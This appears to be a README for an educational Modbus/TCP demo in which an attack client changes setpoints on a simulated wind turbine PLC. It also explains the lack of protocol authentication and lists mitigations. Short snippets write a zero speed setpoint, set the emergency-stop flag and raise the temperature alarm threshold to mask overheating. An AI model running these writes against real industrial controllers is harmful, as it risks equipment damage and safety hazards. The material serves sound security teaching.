# Modbus ICS attack demonstration

This project demonstrates basic industrial control system (ICS) security vulnerabilities using a simulated wind 
turbine PLC and Modbus/TCP protocol.

## Disclaimer

This demonstration is for **educational purposes only** to understand ICS security risks. Only use these tools on 
systems you own or have explicit permission to test. Unauthorised access to industrial control systems is illegal and 
dangerous.

## Overview

The project consists of two components:

1. **modbus_turbine_simulator.py** - A simulated wind turbine PLC running a Modbus/TCP server
2. **modbus_shutdown_attack_demo.py** - A client that demonstrates an unauthorised setpoint modification attack

## Prerequisites

```bash
pip install pymodbus==3.11.4
```

## Architecture

The simulator creates a virtual PLC with the following Modbus register map:

| Register Type    | Address | Purpose                     | Initial Value |
|------------------|---------|-----------------------------|---------------|
| Holding Register | 1000    | Speed setpoint (RPM)        | 1500          |
| Holding Register | 1050    | Temperature alarm threshold | 95            |
| Holding Register | 1100    | Emergency stop flag         | 0             |
| Input Register   | 2000    | Current speed (RPM)         | 1498          |
| Input Register   | 2050    | Current temperature (°C)    | 72            |

## Usage

### 1. Start the simulator

In one terminal, start the turbine simulator:

```bash
python3 modbus_turbine_simulator.py
```

You should see:
```
[*] UU P&L Turbine PLC simulator running
[*] Listening on 0.0.0.0:502
```

**Note:** Port 502 is the standard Modbus port and requires root/administrator privileges on most systems. If you get 
a permission error, either:

```bash
sudo python3 modbus_turbine_simulator.py
```

Or modify the code to use a non-privileged port like 5020:

```python
StartTcpServer(context=context, address=("0.0.0.0", 5020))
```

### 2. Run the attack demonstration

In a second terminal, run the attack script:

```bash
python3 modbus_shutdown_attack_demo.py
```

Expected output:
```
[*] Connected to target
Current speed: 1498 RPM
Current setpoint: 1500 RPM
[*] Writing zero to speed setpoint (attack)
[✓] Write succeeded
New setpoint: 0 RPM
```

## What just happened?

The attack script demonstrates a common ICS vulnerability:

1. **No Authentication** - The Modbus protocol has no built-in authentication
2. **Unauthorised Write Access** - Anyone who can connect can modify critical setpoints
3. **Physical Impact** - Setting turbine speed to 0 RPM could cause:
   - Emergency shutdown
   - Mechanical stress from rapid deceleration
   - Loss of power generation
   - Potential equipment damage

## Real-world context

This simple attack represents actual vulnerabilities found in industrial systems:

- **Stuxnet (2010)** - Modified PLC code to damage Iranian centrifuges
- **Ukraine Power Grid (2015)** - Attackers remotely opened circuit breakers
- **TRITON/TRISIS (2017)** - Targeted safety systems at a petrochemical plant

## Security mitigations

To protect against these attacks, industrial facilities should:

1. **Network segmentation** - Isolate ICS networks from IT networks and the internet
2. **Firewall rules** - Only allow specific IPs to access Modbus devices
3. **VPN/Authentication** - Use encrypted tunnels and authentication layers
4. **Monitoring** - Log all Modbus traffic and alert on unexpected writes
5. **Physical security** - Secure access to control rooms and network equipment
6. **Read-Only access** - Where possible, restrict devices to read-only operations

## Additional experiments

### Read-only monitoring

Create a monitoring script that only reads values:

```python
while True:
    speed = client.read_input_registers(2000, 1)
    temp = client.read_input_registers(2050, 1)
    print(f"Speed: {speed.registers[0]} RPM, Temp: {temp.registers[0]}°C")
    time.sleep(1)
```

### Emergency stop attack

Modify the attack to trigger emergency stop:

```python
client.write_register(address=1100, value=1)
```

### Temperature alarm manipulation

Change the alarm threshold to mask dangerous conditions:

```python
client.write_register(address=1050, value=200)  # Raise alarm threshold
```

## Testing network security

To test network-level protections:

1. Run simulator on one machine
2. Run attack from another machine on the network
3. Implement firewall rules to block unauthorised access
4. Verify that legitimate monitoring still works

## Learning Resources

- **ICS-CERT Advisories**: https://www.cisa.gov/ics
- **Modbus Protocol Spec**: https://modbus.org/specs.php
- **NIST ICS Security Guide**: https://csrc.nist.gov/publications/detail/sp/800-82/rev-2/final

## License

This educational demonstration is provided as-is for learning purposes only.